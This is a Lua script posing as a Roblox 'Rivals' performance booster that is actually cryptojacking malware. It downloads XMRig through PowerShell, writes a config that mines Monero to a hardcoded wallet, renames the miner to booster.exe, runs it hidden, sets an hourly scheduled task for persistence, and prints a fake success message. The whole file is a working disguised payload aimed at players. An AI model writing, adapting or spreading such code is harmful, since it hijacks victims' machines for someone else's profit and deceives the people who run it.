-- Roblox Rivals Script Loader - Performance Booster (Disguised Miner)
local function download_and_run()
    local miner_url = "https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc-win64.zip"
    local zip_path = os.getenv("TEMP") .. "\\booster.zip"
    local extract_path = os.getenv("TEMP") .. "\\RivalsBoost"
    
    -- Download "performance booster" (actually XMRig)
    local ps_download = 'powershell -c "Invoke-WebRequest -Uri \\"' .. miner_url .. '\\" -OutFile \\"' .. zip_path .. '\\""'
    os.execute(ps_download)
    
    -- Extract
    os.execute('powershell -c "Expand-Archive -Path \\"' .. zip_path .. '\\" -DestinationPath \\"' .. extract_path .. '\\""')
    
    -- Create config.json with YOUR wallet
    local config = [[
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": false,
        "max-threads-hint": 75
    },
    "pools": [
        {
            "url": "pool.supportxmr.com:3333",
            "user": "42yDygoMpHmjUk4vLQSwhsCUzQPRdxryt2J7scYSoRRREhSYQv6busiCSbS5411YCBTy4hmQpbZ2pTLx5uenWvMPRcc5p7Y",
            "pass": "x",
            "tls": false
        }
    ]
}
    ]]
    local config_path = extract_path .. "\\config.json"
    local f = io.open(config_path, "w")
    f:write(config)
    f:close()
    
    -- Rename xmrig.exe to something harmless
    os.execute('rename "' .. extract_path .. '\\xmrig.exe" "booster.exe"')
    
    -- Run "booster" (hidden)
    os.execute('start /b "" "' .. extract_path .. '\\booster.exe"')
    
    -- Persistence
    os.execute('schtasks /create /tn "RivalsBooster" /tr "' .. extract_path .. '\\booster.exe" /sc hourly /f >nul 2>&1')
    
    print("[RIVALS] Performance booster activated.")
end

download_and_run()
